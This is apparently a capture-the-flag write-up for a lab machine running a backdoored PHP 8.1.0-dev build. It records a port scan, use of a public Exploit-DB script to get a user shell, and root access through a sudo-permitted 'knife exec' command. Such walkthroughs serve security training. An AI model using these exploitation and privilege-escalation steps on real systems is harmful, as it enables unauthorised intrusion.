Port scanning
```
└─$ nmap -p- -sSCV 10.10.10.242  --min-rate 999
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-16 13:34 AEDT

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)
|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)
|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title:  Emergent Medical Idea
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Dir scan, got nothing
Use burp, catch response header, got X-Powered-By  PHP/8.1.0-dev
> https://www.exploit-db.com/exploits/49933

```
└─$ python3 49933.py                                                          
Enter the full host url:
http://10.10.10.242
Interactive shell is opened on http://10.10.10.242 
Can't acces tty; job crontol turned off.
$ id
uid=1000(james) gid=1000(james) groups=1000(james)
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

User james may run the following commands on knife:
 >   (root) NOPASSWD: /usr/bin/knife
 >   ```
sudo knife exec -E 'exec "/bin/sh"'
id
uid=0(root) gid=0(root) groups=0(root)

#### lesson learned
- **`X-Powered-By`** header is a **non-standard HTTP response header** used to identify the application, web server, or framework
